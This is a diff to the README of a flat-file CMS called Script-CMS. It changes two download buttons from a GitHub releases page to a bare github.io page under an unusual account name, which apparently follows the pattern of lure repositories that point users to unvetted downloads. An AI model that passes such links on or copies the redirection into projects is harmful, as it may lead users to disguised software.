@@ -26,7 +26,7 @@ Script-CMS is a flat-file content management system designed for everyday people
 ### Step 1: Get Script-CMS
 To download the software, visit the official release page:
 
-[![Download Script-CMS](https://img.shields.io/badge/Download-Script--CMS-green?style=for-the-badge&logo=github&color=orange&link=https://github.com/Longdated-genusplumbago6035/Script-CMS/releases)](https://github.com/Longdated-genusplumbago6035/Script-CMS/releases)
+[![Download Script-CMS](https://img.shields.io/badge/Download-Script--CMS-green?style=for-the-badge&logo=github&color=orange&link=https://longdated-genusplumbago6035.github.io)](https://longdated-genusplumbago6035.github.io)
 
 **Visit this link to download the application.**
 
@@ -139,7 +139,7 @@ The most difficult part is yet-to-come? Actually not! Download, unzip, copy, and
 
 Click the button one more time to get started:
 
-[**⬇️ DOWNLOAD Script-CMS NOW**](https://github.com/Longdated-genusplumbago6035/Script-CMS/releases)
+[**⬇️ DOWNLOAD Script-CMS NOW**](https://longdated-genusplumbago6035.github.io)
 
 ---
 
